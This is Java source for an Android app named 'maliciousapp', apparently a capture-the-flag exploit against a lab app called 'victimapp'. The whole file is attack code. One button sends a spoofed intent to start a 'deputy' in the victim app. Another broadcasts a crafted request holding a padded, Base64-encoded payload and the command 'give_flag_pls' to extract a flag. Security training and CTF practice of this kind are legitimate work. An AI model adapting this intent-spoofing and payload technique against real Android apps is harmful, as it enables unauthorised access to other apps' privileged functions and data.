package com.example.maliciousapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.nio.charset.Charset;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


        Button startDeputy = findViewById(R.id.deputy);

        startDeputy.setOnClickListener((v)->{
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.MainActivity"));
            intent.putExtra("command", "start_deputy");
            startActivity(intent);
        });

        Button sendPayload = findViewById(R.id.send_payload);

        sendPayload.setOnClickListener((v)-> {
            Intent intent2 = new Intent("FORMAL_FLAG_REQUEST");
            Bundle bundle = new Bundle();
            String payload = "";
            for (int i = 0; i < 200; i++) {
                payload += "C";
            }

            String as = "";
            for (int i = 0; i < 50; i++) {
                as += "A";
            }

            String foo = "CCCCCCCCCCflow_bridge_pivot";
            String finalString = as+foo+payload;

            bundle.putString("request", Base64.encodeToString(finalString.getBytes(),0));

            intent2.putExtras(bundle);

            intent2.putExtra("n1", 1337);

            intent2.putExtra("n2", 0);

            intent2.putExtra("command", "give_flag_pls");

            sendBroadcast(intent2);
        });
    }
}